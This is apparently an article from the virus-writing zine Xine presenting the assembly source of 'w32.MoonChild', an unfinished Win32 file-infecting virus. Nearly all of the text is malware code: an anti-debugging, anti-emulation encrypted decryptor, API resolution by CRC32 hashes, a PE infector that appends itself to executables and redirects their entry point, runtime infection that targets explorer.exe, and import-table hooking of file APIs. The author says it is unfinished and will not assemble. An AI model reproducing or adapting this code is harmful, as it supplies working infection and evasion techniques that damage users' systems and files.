   ;
   ;
   ;                                              ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;                                              ³ Xine - issue #5 - Phile 204 ³
   ;                                              ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ;
   ;
   ;
   ;
   ;
   ;
   ;         w32.Moonchild.never.ever - ?
   ;
   ;
   ;         heh, this was a virus i never finished... though its maybe interesting
   ;         to read, because it is pretty anti debugging, and it is internet aware.
   ;
   ;         i made it a pretty long time ago, but i got bored of it, and stopped
   ;         it.
   ;
   ;         it contains the poly engine from w9x.matrix (ctrl+c/v), IRC & SMTP
   ;         engine.
   ;
   ;         hey.. you can NEVER assemble it :)
   ;
   ;         but while coding it i learned pretty much.. about SMTP, IRC, etc.
   ;         and i learned how-to-use the RFC's ;)
   ;
   ;         bye!
   ;
   ;         LW
   ;
   ;         and erh... it contains some very LAME bugs ;) but remember i made it
   ;         when i was young ;)
   ;
   ;         and erh2... it is some on-disk-do-not-release version... containg
   ;         comments for me, not for you :)
   ;
   ; ;----------------------------------------------------------------------------;
   ; comment ÿ
   ;
   ;  w32.MoonChild by Lifewire [IKX] ...
   ;
   ;  w32 perprocess, self mailing, IRC connecting, listening for commands...
   ;
   ;  I de-optimized it because it was too optimized ;)
   ;
   ;  It creates 2 threads, one for IRC connecting and one for self-mailing.
   ;
   ;  the threads stay running with the host, and when the hooked ExitProcess api
   ;  is called the threads & wsock services are stopped.
   ;
   ;
   ;  Used docs: Iczelions docs about some things, win32.hlp, IRC & SMTP
   ;             RFC's, GriYo's Parvo. (SMTP code from it)
   ;
   ;             also disassembly/debugged Cain and PeShield.
   ;
   ;  Greets to: PiepPiep, f0re, Darkman, BillyBelcebu, StarZer0, Dageshi, Asmodeus,
   ;             Evul, Gigabyte, Kamaileon, GriYo, MaskBits, Ruzz, Roadkil, Raid,
   ;             VirusBuster, Ultras, Xsprite, the other IKX members,
   ;             Nala-Bebe-the-friend-of-the-virus-coders, 29A, Matrix Virus Group,
   ;             ShadowvX (nothing wrong with you!) and the #virus people who love
   ;             me... :P also to these guys: hampst0r for being the most annoying
   ;             guy, and stean for his cool metal mp3s heh and ig0r for talking
   ;             about quantumphysics *OUGH!* ;))
   ;
   ; ;----------------------------------------------------------------------------;
   ÿ
   .586p
   .model flat
   include c:\tasm\bin\win32api.inc

   debug           equ     1

   __mCRC32        equ     0C1A7F39Ah              ;stolen from a 29a source
   __mCRC32_init   equ     09C3B248Eh              ;(dunnow the author)
   crc32m  macro   string                          ;actually the creator has lot
               crcReg = __mCRC32_init              ;of skill, it smells a lil
               irpc    _x,<string>                 ;like Vecna :)
           ctrlByte = '&_x&' xor (crcReg and 0FFh)
           crcReg = crcReg shr 8
           rept 8
               ctrlByte = (ctrlByte shr 1) xor (__mCRC32 * (ctrlByte and 1))
           endm
           crcReg = crcReg xor ctrlByte
           endm
           dd  crcReg
   endm

   GMEM_ZEROINIT   equ     40h                             ;used by GlobalAlloc
   GMEM_FIXED      equ     0h

   IMAGE_SCN_MEM_READ      equ  40000000h                  ;section flags
   IMAGE_SCN_MEM_WRITE     equ  80000000h
   IMAGE_SCN_MEM_SHARED    equ  10000000h

   RuntimeFiles    equ     1                               ;nr. file 2 infect
   virusVsize      equ     endofuidata-start               ;Virtual Size
   virusRsize      equ     endofidata-start                ;Raw Size


   extrn   ExitProcess:proc;

   extrn   CreateProcessA:proc;            ;***test
   extrn   CreateFileA:proc;
   extrn   CopyFileA:proc;
   extrn   MoveFileA:proc;

   virusz  equ     offset endofidata - offset start

   ;----------------------------------------------------------------------------;
   _CODE   segment dword use32 public 'CODE'


   ;----------------------------------------------------------------------------;
   ;       The 'Host'
   ;----------------------------------------------------------------------------;

   hoststart:
           int     3
           push    eax                     ;first generation push

           pushad
           xor     ebp,ebp
           call    setupcryptor
           popad

           mov     eax,offset start
           push    eax
           ret

   ;----------------------------------------------------------------------------;
   ;       ***     REAL VIRUS STARTS HERE  ***
   ;----------------------------------------------------------------------------;
   start:
           int     3

           pushad

           call    deltabtd                ;This first part is quite uncommented
   afterdelta:                             ;because, even with comments, you
           db      0ffh                    ;won't understand it :) ... Because
   deltabtd:                               ;the reason i wrote this code was to
           neg     esp                     ;confuse people (AV) :)
           inc     eax
           neg     esp
           pop     eax
           xchg    eax,ebp
           jmp     a
           db      0ffh
   a:      sub     ebp,offset afterdelta
           jmp     b
           db      0eah
   b:
           push    ss

           call    addeip1
           db      0c7h
           lea     edx,ebp+cryptedcrypter-1

           call    multicall
           db      0c7h

           call    multicall
           db      0ffh

           mov     ebx,(endcryptedcrypter - cryptedcrypter)

           call    addeip1
           db      12h                       ;------decryptor initialised


           ;ebx = offset in crypted crypter (0-xx), edx = offset OFF crypted crypter

   dec1:
           push    cs
           push    ss
           push    ss
           pop     ss

           call    multicall
           db      0c7h
           mov     cl,byte ptr [ebx+edx]
           jmp     overaddeip1
           db      0eah,04h

   addeip1:
           call    addeip2
           db      02eh,08bh
           pop     eax
           inc     eax
           push    eax
           ret

   overaddeip1:
           pop     ss
           call    addeip1
           db      0eah

           call    multicall
           db      0ffh


           call    next
           jmp     bitch
           db      0ffh
   next:
           fnop                                    ;anti emu?
           retf                                    ;anti emu?

   addeip2:
           pop     eax
           inc     eax
           inc     eax
           push    eax
           ret

   bitch:
           call    addeip2
           db      0eah,04h
           call    multicall
           db      0eah
           jmp     f
           db      0e9h
   f:
           call    c
           dw      5196h
           jmp     d

   multicall:
           call    addeip1
           db      0e9h
           call    addeip2
           db      0c7h,87h
           pop     eax
           inc     eax
           push    eax
           ret

   c:
           pop     eax
           add     eax,2
           xor     cl,55h
   key1    equ     $-1
           jmp     eax
           db      0ffh,24h
   d:
           mov     byte ptr es:[edx+ebx],cl                ;ds:anti emu?
           call    addeip1
           db      12h
           dec     ebx
           jmp     e
           db      0e8h
   e:      jz      endcrypt1
           call    addeip2
           dw      6612h
           jmp     dec1
           db      036h,08bh

   endcrypt1:

   ;        int     3                       ;bpint 3 do "rip ip+1" ? :)

   ;------------------------------------------------------------------------------
   cryptedcrypter:                       ;here starts the encrypted decrypter :)

           call    multicall
           db      054h
           mov     ecx,(vend-vstart)
           call    multicall
           db      034h
           lea     esi,[ebp+offset vstart-1]
           call    multicall
           db      067h
           xor     edx,edx

   decryptmain:


   ;------------------------------------------------------------------------------
   ; The following piece of code creates a sort checksum of important areas, and
   ; includes SoftIce breakpoints in its checksum!! And the main body is crypted
   ; using that checksum too... so av's will have some fun :)
   ;
   ; (don't think i'm cool :) this was not my idea, but i didn't see it in the vx
   ; scene yet)...

   createkey:                              ;using our 'checksum'
           push    ecx
           push    ebp

           lea     ebp,[ebp+offset dec1-3]
           call    multicall
           db      0ffh
           mov     ecx,(vstart-dec1)-8
           call    multicall
           db      0ffh
           jmp     genkey
           db      0ffh
   g:
           jmp     gg
           db      0f7h
   genkey:
           call    multicall
           db      0ffh

           dec     ebp

           call    addeip1
           db      0ffh

           rol     eax,1                   ;confusing?

           call    addeip2
           db      0ffh,24h

           db      03h,54h,0dh,00h         ;add edx,[ebp+ecx+0] (?)

           inc     ebp

           call    multicall
           db      036h

           add     dl,byte ptr fs:[23h]    ;confuse the damned AV'er! (0)

           call    addeip2
           db      0c7h,05h

           call    multicall
           db      0fh

           rol     edx,3

           call    addeip2
           db      0c7h,05h

           xor     edx,"LiŸî"
   mainkey equ     $-4

           dec     ecx
           jmp     dontyouloveme;?
           db      0f2h,0f3h
   dontyouloveme:
           jmp     ready;?
           db      0f7h,05h
   ready:
           jmp     g
           db      12h
   gg:
           jnz     genkey


           pop     ebp
           push    ss
           pop     ss
           call    multicall
           db      12h
           pop     ecx
   ;------------------------------------------------------------------------------

   decryptmainbody:
           xchg    edi,ecx

           call    multicall
           db      0fh

           push    14                              ;decrypt body using checksum
           pop     ecx
   hah:
           rol     edx,cl

           call    multicall
           db      0c7h

           xor     byte ptr [esi+edi],dl

           call    multicall
           db      0c6h

           loop    hah

           call    addeip2
           db      0c7h,083h

           call    addeip2
           db      0c7h,081h

           call    addeip1
           db      0bbh

           xchg    ecx,edi

           call    multicall
           db      55h

           dec     ecx
           jz      donedecbtd

           call    multicall
           db      44h

           push    ecx

           call    multicall
           db      0feh

           and     cl,111b

           call    multicall
           db      0efh

           cmp     cl,3
           pop     ecx
           je      createkey

           call    multicall
           db      02fh

           jmp     decryptmainbody

           db      081h,3dh

   donedecbtd:


   endcryptedcrypter:      ;(this cryptor was crypted... duh! :)
   ;------------------------------------------------------------------------------


   ;------------------------------------------------------------------------------
   vstart:
   ;        int     3

           pop     ss
           call    addeip1numero2                  ;annoying to da bone! :)
           db      0ffh
           jmp     overaddeip1numero2

           db      0c7h

   addeip1numero2:
           pop     eax
           inc     eax
           push    eax
           ret

   overaddeip1numero2:

           int     3

           cld

           call    delta
   delta:
           pop     ebp
           sub     ebp,offset delta

           lea     edx,[ebp+importedapis]
           mov     dword ptr [ebp+oldedi],edx

   ;----------------------------------------------------------------------------;
   ;       ***     VIRUS API Initialisation starts here    ****
   ;----------------------------------------------------------------------------;
                                ;short&sweet (shorter then the original code:P)
                                         ;-;------.------.--.----.----.
           mov     ecx,[esp+24h]           ;Return adress of call from
                                           ;CreateProcess
   ;---------------------------------------;---.--------.------.----.------..---;
   GetKrnlBaseLoop:                        ;Get Kernel32 module base adress
           dec     ecx                     ;Scan backward
           movzx   edx,word ptr [ecx+03ch] ;Take beginning of PE header
           test    dx,0f800h               ;Is it a PE header ?
           jnz     GetKrnlBaseLoop         ;No, forget about it
           cmp     ecx,[ecx+edx+34h]       ;Compare current adress with the
                                           ;address that PE should be loaded at
           jnz     GetKrnlBaseLoop         ;Different ? Search again
   ;----------------------------------------------------------------------------;
                                                                                ;

   ;       Here we have ecx pointing to the start of the kernel32DLL in memory

                                                                                ;
           mov     byte ptr [NOF+ebp],NOFK32
           lea     esi,[functions+ebp]

           call    GetApis                         ;Get Kernel32 APIs

           push    ecx

           push    virusVsize+500                  ;Virtual Size of Virus
           push    GMEM_FIXED or GMEM_ZEROINIT
           call    [ebp+iGlobalAlloc]               ;get some mem. for our api-
                                                   ;imports & other (buffer) shit
           push    eax

           lea     ecx,[ebp+offset returntohost]
           mov     dword ptr [ebp+back2real],ecx

           mov     dword ptr [ebp+oldelta],ebp

           lea     esi,[start+ebp]
           xchg    edi,eax                         ;*** mov
           mov     ecx,virusVsize
           cld
   rep     movsb

           pop     ebp

           mov     eax,ebp

           sub     ebp,offset start
           add     eax,(offset FurtherInMem-start) ;...
           push    eax
           ret                                     ;RET to copy in allocated mem.

   FurtherInMem:

           call    getpointerws32
           db 'WSOCK32.DLL',0
   getpointerws32:
           call    [ebp+iLoadLibraryA]

           pop     ecx
           mov     edi,eax
           push    edi

           add     eax,[eax+03ch]                ;pointer to PE

           mov     ebx,edi
           add     edi,[eax+078h]          ;rva exporttable/names
           add     ebx,[edi+(8*4)]         ;pointer to names
                                           ;ebx points now to name RVA's
           pop     esi
           push    esi                     ;modulehandle/pointer

           add     esi,[ebx]               ;pointer to name

           push    esi

           lea     edx,[ws32icrc+ebp]
           xchg    edi,ecx                 ;where to store retrieved APIaddreses
           lea     edi,[ws32i+ebp]         ;*** mov edi,ecx
                                           ;*** mov     ecx,NOFWS32
           push    NOFWS32
           pop     ecx


   ;ESI-names,EDX-crcs,ECX-numberofCRCs,EDI-store

   checkcrc:
           mov     ebx,esi
           call    crc32
           cmp     dword ptr [edx],eax
           jne     checkcrc

           pop     esi
           pop     eax                     ;pointer module/handle
           push    eax
           push    edx
           push    ecx
           push    ebx                     ;name
           push    eax
           call    [ebp+iGetProcAddress]
           pop     ecx
           pop     edx
           cld
           stosd
           add     edx,4
           push    esi
           loop    checkcrc
           pop     eax
           pop     eax
   ;----------------------------------------------------------------------------;

   ;----------------------------------------------------------------------------;
   ;       ***     Virus initialising done,start threads, runtime infect ***
   ;----------------------------------------------------------------------------;

           call    PushNameOfSemaphore
           db      "m00n",0                        ;push offset on stack
   PushNameOfSemaphore:
           xor     eax,eax
           inc     eax
           push    eax                             ;Max Count
           dec     eax
           push    eax                             ;Initial Count
           push    eax                             ;Sec. Attr.
           call    [ebp+iCreateSemaphoreA]          ;
           or      eax,eax
           jz      endfun

           mov     [ebp+SemaphoreHandle],eax       ;

           xor     edx,edx                         ;increase semaphore
           push    edx                             ;to max count
           inc     edx                             ;if already at maxcount error
           push    edx                             ;that means we already run
           push    eax                             ;semaphore handle
           call    [ebp+iReleaseSemaphore]
   ;***        or      eax,eax
   ;           jz      AlreadyActive                   ;if error

           xchg    eax,ecx
           jecxz   AlreadyActive

   ;        call    startthreads

   AlreadyActive:
           push    dword ptr [ebp+SemaphoreHandle]
           call    [ebp+iCloseHandle]
   endfun:

           ;... Infect at runtime 3 random files & %windir%\explorer.exe
          ;(LAME! BUG! explorer.exe = running = unwritable! fucker! lifewire=gay)
          ;looser!!

           xor     esi,esi
           push    RuntimeFiles                ;*** mov ecx
           pop     ecx
   infectloop:
           call    infect
           loop    infectloop

   ;----------------------------------------------------------------------------;
   ;       ***     Hook the by-host-imported API's     ***
   ;----------------------------------------------------------------------------;

           push    0                               ;0 = current module (I hope:)
           call    [ebp+iGetModuleHandleA]          ;

           mov     ecx,eax
           mov     esi,eax
           add     esi,dword ptr [eax+3ch]         ;RVA pointer to PE
           add     ecx,dword ptr [esi+80h]         ;Importtable RVA

           ;ECX = import table header, EAX = base

   SearchRightImportDLL:
           mov     edx,eax
           add     edx,[ecx+0ch]           ;edx<-pointer to NAME1/DLL to import

           cmp     dword ptr [edx+2],"LENR"        ;KE-RNEL-32.DLL ?
           je      dll2hookOK
           cmp     dword ptr [ecx],0
           je      EndOfImport
           add     ecx,14h                 ;size
           jmp     SearchRightImportDLL

   dll2hookOK:     ;ECX = right import header

           mov     esi,[ecx]
           add     esi,eax

           xchg    edx,eax                 ;*** mov

           ;EDX = base, ESI points to array with DWORDS that point to API-names

           push    esi

           lea     edi,[ebp+hookedapicrcs]

   ResearchRightAPIs:
           mov     eax,[ecx+10h]
           add     eax,edx                 ;EAX = Array with addresses of API's
   ImportHookApiSearchLoop:

           push    eax
           lodsd                           ;EAX = RVA of word / asciiz struc
           or      eax,eax
           jz      lastapi

           push    esi
           lea     esi,[edx+eax+2]         ;esi <- edx+ex+2 = VA off API asciiz

           call    crc32                   ;calculate crc32
           pop     esi                     ;ESI<-array with dword of RVA of API
   ;***    mov     ebx,eax                 ;EBX<-crc32
           xchg    ebx,eax
           pop     eax

           add     eax,4
           cmp     ebx,dword ptr [edi]     ;CRC32 of api == hookCRC ?
           jne     ImportHookApiSearchLoop ;not the api we wanna hook?

           ;--- HOOK API --                ;Hook that API!

           pushad

           sub     edi,(offset hookedapicrcs-offset HookOffsetsTable)
           mov     edi,dword ptr [edi]
           add     edi,ebp                 ;EDI<-RightHookHandler

           mov     dword ptr [eax-4],edi

           popad
           jmp     nopop

   lastapi:
           pop     eax
   nopop:
           pop     esi

           add     edi,4

           lea     eax,[offset endhookcrcs+ebp]
           cmp     edi,eax                 ;all API-CRC's checked?
           push    esi
           jb      ResearchRightAPIs

           pop     esi

   EndOfImport:

   ;----------------------------------------------------------------------------;
   ;       ***     Runtime infect  ***
   ;----------------------------------------------------------------------------;

           lea     eax,[ebp+buffer]
           push    eax
           push    260d                            ;MAX_PATH
           push    eax
           call    [ebp+iGetWindowsDirectoryA]
           pop     edi                             ;buffer
   ;***        or      eax,eax
   ;***        jz      NoWinDir                        ;??!


           xchg    eax,ecx
           jecxz   NoWinDir

           push    edi

   ;***        add     edi,eax                         ;buffer+length
           add     edi,ecx

           lea     esi,[ebp+explorerfn]
   ;***        mov     ecx,explorerfnsz

           push    explorerfnsz
           pop     ecx
           cld
   rep     movsb

           pop     esi
           call    infect                          ;infect %windir%\explorer.exe
   NoWinDir:

           push    0
           push    0
           call    [ebp+iBeep]

           mov     eax,12345678h                   ;12345678 will be patched
   back2real       equ     $-4
           jmp     eax

   ;----------------------------------------------------------------------------;

   copyright:
   db      "<W32.MoonChild.",virusRsize/1000 mod 10+'0'
   db      virusRsize/0100 mod 10+'0'
   db      virusRsize/0010 mod 10+'0'
   db      virusRsize/0001 mod 10+'0'," by Lifewire2000 [IKX?] - Thx to PiepPiep!>"

   ;----------------------------------------------------------------------------;
   ;       ***     Virus did his jobs, return to our host  ***
   ;----------------------------------------------------------------------------;

   returntohost:

           mov     ebp,12345678h
   oldelta equ     $-4

           mov     edi,dword ptr [esp+20h]

           lea     esi,[OrgHostCode+ebp]
           push    Jmp2VirusCodeSz
           pop     ecx

           rep     movsb                           ;restore bytes from host

           popad

           int     3

           nop
           nop
           nop
           nop
           nop
           nop
           nop
           nop

           ret                             ;jmp to virus coded putted offset
                                           ;on the stack...
   ;----------------------------------------------------------------------------;

   explorerfn      db      "\EXPLORAH.EXE"
   explorerfnsz    equ     $-offset explorerfn

   ;----------------------------------------------------------------------------;
   crc32:                                          ;ofcourse i stole this... :)
           push    edx
           mov edx,__mCRC32_init
       __gCRC32_next_byte:
           lodsb
           or  al,al           ;end of name ?
           jz  __gCRC32_finish

           xor dl,al
           mov al,08h
       __gCRC32_next_bit:
           shr edx,01h
           jnc __gCRC32_no_change
           xor edx,__mCRC32
       __gCRC32_no_change:
           dec al
           jnz __gCRC32_next_bit
           jmp __gCRC32_next_byte
       __gCRC32_finish:
           xchg    eax,edx         ;CRC32 to EAX
           pop edx
           ret
   ;----------------------------------------------------------------------------;
   ;       ***     infects the file at ESI ***
   ;----------------------------------------------------------------------------;

   ;The hugest & lamest PE infector ever, (C) Lifewire :)

   infect:
           pushad
           or      esi,esi
           jnz     blaatorweg
           lea     esi,[filenametemp+ebp]
   blaatorweg:
           call    infectfile
           popad
   returninfect:
           ret

   infectfile:
   if debug eq 1
           int     3
   endif
           call    checkname
           or      eax,eax
           jnz     returninfect

           push    esi
           call    [ebp+iGetFileAttributesA]                ;Save old ATTRs

           inc     eax
           jz      err_b4_open
           dec     eax
           mov     dword ptr  [oldattr+ebp],eax

           push    FILE_ATTRIBUTE_NORMAL
           push    esi
           call    [ebp+iSetFileAttributesA]                ;Reset them
           or      eax,eax
           jz      err_b4_open


   ;***        xor     eax,eax

           cdq

           push    edx
           push    FILE_ATTRIBUTE_NORMAL
           push    OPEN_EXISTING
           push    edx
           push    edx
           push    GENERIC_READ or GENERIC_WRITE
           push    esi
           call    [ebp+iCreateFileA]
           inc     eax
           jz      err_b4_open
           dec     eax

           mov     dword ptr [fileh+ebp],eax

           push    eax                                     ;handle

           push    0
           push    eax
           call    [ebp+iGetFileSize]
           inc     eax
           jz      err_opened
           dec     eax

           push    eax

           sub     edx,edx
   ;***        mov     ecx,101
           push    101
           pop     ecx

           div     ecx
           or      edx,edx
           pop     eax
           pop     ecx                                     ;if remaineder = 0
           jz      err_opened                              ;already infected

           add     eax,10000                               ;some workspace

   ;***        xor     edx,edx

           cdq                                     ;only worx if eax<80000000,
                                                   ;i don't hope filesize > 80000 :)
           push    edx
           push    eax                                     ;max size low
           push    edx
           push    PAGE_READWRITE
           push    edx
           push    ecx                                     ;handle
           call    [ebp+iCreateFileMappingA]
           or      eax,eax
           jz      err_mapped

           mov     dword ptr [filemaph+ebp],eax

           xor     edx,edx
           push    edx
           push    edx
           push    edx
           push    FILE_MAP_WRITE
           push    eax                             ;handle
           call    [ebp+iMapViewOfFile]

           push    eax                             ;pointer to map
           xchg    eax,esi

           cmp     word ptr [esi],'ZM'             ;EXE?
           jne     err_mapviewed

           add     esi,dword ptr [esi+03ch]        ;filealign

           cmp     dword ptr [esi],'EP'            ;is PE/0/0 ?
           jne     err_mapviewed

           cmp     word ptr [esi+04],014ch         ;386
           jb      err_mapviewed

           cmp     word ptr [esi+04],014eh         ;586?
           ja      err_mapviewed

           cmp     dword ptr [esi+01ch],Jmp2VirusCodeSz
           jb      err_mapviewed

           mov     edi,esi

           add     si,word ptr [esi+14h]           ;ntheader/optionalheader
           add     esi,18h

           ;EDI = PE    -    ESI = Section Header

           push    esi

           ;Find the last section (with highest PointerToRawData)

           sub     eax,eax
           movzx   ecx,word ptr [edi+6]            ;nr. of objects/sections

   LookHighest:
           mov     edx,dword ptr [esi+14h]         ;pointer to rawdata
           cmp     edx,eax
           jb      NotHigher
           mov     eax,edx
           mov     ebx,esi
   NotHigher:
           add     esi,28h
           loop    LookHighest
                                                   ;EBX = choosen section
           mov     edx,dword ptr [ebx+14h]         ;PointerToRawData
           add     edx,edi                         ;PE
           add     edx,dword ptr [ebx+10h]         ;SizeOfRawData

           or      [ebx+24h], (IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE) ;updateflags

           pop     esi                             ;ESI = sections

           and     [ebx+24h], not IMAGE_SCN_MEM_SHARED

           pop     eax                             ;MZ (StartOfMap)
           push    eax                             ;Put back on stack

           sub     edx,dword ptr [eax+03ch]        ;...

           pushad

           ;Create JMP to virus section...

           mov     edx,dword ptr [ebx+10h]         ;RVA+Rawsize = VA where Virus
           add     edx,dword ptr [ebx+0Ch]         ;starts...
           add     edx,dword ptr [edi+34h]
           mov     dword ptr [ebp+jmpval],edx      ;This is the value to jmp

           mov     eax,[edi+28h]                           ;backup entry RVA

           sub     esi,28h                         ;ESI=SectionHeader

   look:   add     esi,28h
           mov     edx,eax                         ;Old EntryPoint (RVA)
           sub     edx,dword ptr [esi+0Ch]         ;VirtualAddres
           cmp     edx,dword ptr [esi+08h]         ;VirtualSize
           jae     look

           or      [esi+24h],IMAGE_SCN_MEM_WRITE   ;make writable
           and     [esi+24h], not IMAGE_SCN_MEM_SHARED

           sub     eax,dword ptr [esi+0ch]         ;sub RVA
           add     eax,dword ptr [esi+14h]         ;add PhysicalOffset
                                                   ;EAX is now the PhysicalOffset
                                                   ;of the EntryPoint

           add     eax,dword ptr [esp+20h]         ;map/handle after PUSHAD

           mov     esi,eax

           lea     edi,[ebp+OrgHostCode]

           push    Jmp2VirusCodeSz
           pop     ecx

           pushad
           rep     movsb
           popad

   ;***        mov     edi,eax
           xchg    edi,eax

           lea     esi,[ebp+Jmp2VirusCode]
           rep     movsb

           popad
           mov     edi,edx
           call    setupcryptor                    ;setup antidebug crypters at
                                                   ;the start of the vir.
           call    CreatePoly                     ;poly returns total size in ECX
                                                   ;ECX = end of code
           ;...

           pushad
           mov     eax,ecx
           sub     eax,edi
           lea     ecx,[ebx+10h]
           add     dword ptr [ecx],eax             ;SizeOfRawData
           mov     eax,dword ptr [ecx]
           add     eax,(virusVsize-virusRsize)
           cmp     dword ptr [ebx+8h],eax          ;is VirtualSize already big
           ja      noupdate                        ;enough for the virus?
           mov     dword ptr [ebx+8h],eax
   noupdate:
           popad

           sub     ecx,eax                         ;ecx = end of code
           mov     eax,ecx

           push    101d
           pop     ecx
           xor     edx,edx
           div     ecx
           inc     eax
           mul     ecx                             ;eax = 101 aligned size..


           pop     edx                             ;pointer to filemap / MZ
           push    edx                             ;pointer to filemap / MZ
           push    eax
           push    edx                             ;pointer to filemap / MZ
           call    [ebp+iUnmapViewOfFile]           ;base addr. already on stack

           push    dword ptr [ebp+filemaph]
           call    [ebp+iCloseHandle]

           pop     eax                             ;new 101 aligned size

           sub     ecx,ecx
           push    ecx
           push    ecx
           push    eax
           push    dword ptr [fileh+ebp]
           call    [ebp+iSetFilePointer]            ;

           push    dword ptr [fileh+ebp]
           call    [ebp+iSetEndOfFile]

           ;We could do a jmp here over the map-closers, but that's not needed...

   err_mapviewed:
           call    [ebp+iUnmapViewOfFile]           ;base addr. already on stack

   err_mapped:
           push    dword ptr [ebp+filemaph]
           call    [ebp+iCloseHandle]

   err_opened:
           push    dword ptr [ebp+fileh]
           call    [ebp+iCloseHandle]

   err_b4_open:
           ret
   ;----------------------------------------------------------------------------;


   OrgHostCode     label   byte
           ret
           db      (Jmp2VirusCodeSz-1) dup (90h)


   Jmp2VirusCode:
           push    eax
           mov     eax,12345678h
   jmpval  equ     $-4
           push    eax
           ret

   Jmp2VirusCodeSz equ $-Jmp2VirusCode

   db      "-OSDORP-POSSE-"

   ;----------------------------------------------------------------------------;
   ;       Retrieve needed apis
   ;
   ;       poorly coded, but i did it by myself :)
   ;
   GetApis:
           mov     eax,ecx
           mov     edi,eax
           mov     edx,eax

           add     eax,[eax+03ch]                ;pointer to PE

           mov     ebx,edi
           add     edi,[eax+078h]        ;rva exporttable/names
           mov     ecx,[edi+(6*4)]       ;number of f
           add     ebx,[edi+(8*4)]       ;pointer to names
           push    edi
   ;***        mov     edi,ebx
           xchg    edi,ebx

   ;***        mov     ebx,edx
           xchg    ebx,edx


           ;Importing the needed API's to our own 'Import table' :)


           xor     edx,edx

           mov     ecx,esi                 ;esi pointer to offset functions
           mov     esi,edi

   ;----------------------------------------------------------------------------;
   ;       ***     Look in export table of the dll for the API's we need
   ;----------------------------------------------------------------------------;

           push    esi
   searchname:
           lodsd

           mov     edi,ebx
           add     edi,eax                         ;edi points to name

           xchg    esi,edi
           inc     edx
           call    crc32
           xchg    esi,edi

           cmp     eax,[ecx]
           jne     searchname

   ;------ found name and play with it

           pop     esi
           pop     edi
           pushad                                  ;edi points to exp table
                                                   ;ebx points to image base
           mov     eax,ebx

           add     eax,[edi+9*4]                   ;eax points to ordinals array
           shl     edx,1                           ;edx*2
           add     eax,edx

           movzx   ecx,word ptr [eax]              ;ordinal

           mov     eax,[edi+7*4]                   ;funcs
           add     eax,ebx
           dec     ecx
           shl     ecx,2
           add     eax,ecx

           mov     ecx,[eax]
           add     ecx,ebx
   ;***        mov     eax,ecx
           xchg    eax,ecx

           lea     ecx,[oldedi+ebp]
           mov     edi,[ecx]                       ;..:
           stosd
           mov     [ecx],edi

           popad
           push    edi
           push    esi
           xor     edx,edx                         ;reset counter
           add     ecx,4
           dec     byte ptr [NOF+ebp]
           jnz     searchname

           pop     edi
           pop     edi

           ret
   ;----------------------------------------------------------------------------;


   ;----------------------------------------------------------------------------;
   ;       ***     Inet Thread     ***
   ;----------------------------------------------------------------------------;
   startthreads:
           lea     eax,[ebp+ThreadHandle1] ;IRC
           push    eax
           xor     edx,edx                         ;this code starts the INET
           push    edx                             ;services thread which stays
           push    edx                             ;running until the host
           lea     eax,[ebp+InetThread1]           ;terminates...
           push    eax
           push    edx
           push    edx

           lea     eax,[ebp+ThreadHandle2] ;SMTP
           push    eax
           push    edx
           push    edx
           lea     eax,[ebp+InetThread2]
           push    eax
           push    edx
           push    edx

           lea     esi,[ebp+iCreateThread]
           call    [esi]
           call    [esi]

           ret

   ;----------------------------------------------------------------------------;
   ;       ***     The IRC thread  ***
   ;----------------------------------------------------------------------------;
   InetThread1:
           call    thread1delta
   thread1delta:
           pop     ebp
           sub     ebp,offset thread1delta

           ret

   ;----------------------------------------------------------------------------;
   ;       ***     The SMTP thread ***
   ;----------------------------------------------------------------------------;
   InetThread2:
           call    thread2delta
   thread2delta:
           pop     ebp
           sub     ebp,offset thread2delta

           call    get_rnd32
           cmp     al,10h
           ja      donotemailus

           nop

   donotemailus:
           ret



   ;----------------------------------------------------------------------------;
   ;       ***     Checks if it is safe to infect file ***
   ;----------------------------------------------------------------------------;
   checkname:
           push    esi

           xchg    esi,edi
           cld
           mov     al,'.'
   searchdot:
           scasb
           jnz     searchdot

           mov     al,'\'
           std
   searchslash:
           scasb
           jnz     searchslash

           inc     edi
           mov     esi,edi

           push    esi
           cld

   upcase:
           lodsb
           or      al,al
           jz      done


           cmp     al,'z'
           ja      ok

           cmp     al,'a'
           jb      ok

           sub     al,'a'-'A'
   ok:
           stosb
           jmp     upcase
   done:

           pop     esi

           call    crc32                           ;ebx <- CRC32

           xchg    eax,ebx
           lea     esi,[fnamecrc+ebp]
   check:
           lodsd
           or      eax,eax
           jz      checkednames
           cmp     eax,ebx
           jz      checkednames
           jmp     check                           ;if eax = 0, end of crc32s was
                                                   ;reached, so name is ok.
   checkednames:
           pop     esi
           ret

   ;----------------------------------------------------------------------------;
   ;       ***     When the host calls a hooked api it gets somewhre in here ***
   ;----------------------------------------------------------------------------;
   apihooks        label   byte

   HOOKEDCreateProcessA:
           call    HookHandler
           jmp     dword ptr [eax+iCreateProcessA]


   HOOKEDCopyFileA:
           call    HookHandler
           jmp     dword ptr [eax+iCopyFileA]


   HOOKEDCreateFileA:
           call    HookHandler
           jmp     dword ptr [eax+iCreateFileA]


   HOOKEDMoveFileA:
           call    HookHandler
           jmp     dword ptr [eax+iMoveFileA]
   ;--------------------------------------------------------------------------



   ;--------------------------------------------------------------------------
   HookOffsetsTable        label   byte

           dd      offset HOOKEDCreateProcessA
           dd      offset HOOKEDCopyFileA
           dd      offset HOOKEDCreateFileA
           dd      offset HOOKEDMoveFileA
   ;--------------------------------------------------------------------------



   HookHandler:
           pushad
           int     3
           call    nexxxt
   nexxxt:
           pop     ebp
           sub     ebp,offset nexxxt
           mov     esi,[esp+02ch]                  ;last pushed offset = file
           mov     al,byte ptr [esi]
           push    0
           push    0
           call    [ebp+iBeep]
           popad
           call    HookDelta
   HookDelta:
           pop     eax
           sub     eax,offset HookDelta
           ret

   ;--------------------------------------------------------------------------
   ;       *** POLYMORFIC engine which generates decrypter & encrypts code ***
   ;--------------------------------------------------------------------------


   ;
   ; The generated code will look like this:
   ;
   ; pushad
   ; lea RegUsedAsPointer,[eax+placewherecryptedcodestarts]
   ; mov keyregister,randomvalue
   ; sub keyregister,randomvalue
   ; mov counterreg,size
   ; again:
   ; mov tempregister,[RegUsedAsPointer]
   ; xor tempregister,keyregister
   ; mov [RegUsedAsPointer],tempregister
   ; add RegUsedAsPointer,4
   ; dec counterreg
   ; pushf
   ; popf
   ; jz  exit
   ; jmp again
   ; exit:
   ;
   ;
   ; between each instruction some random code is putted.

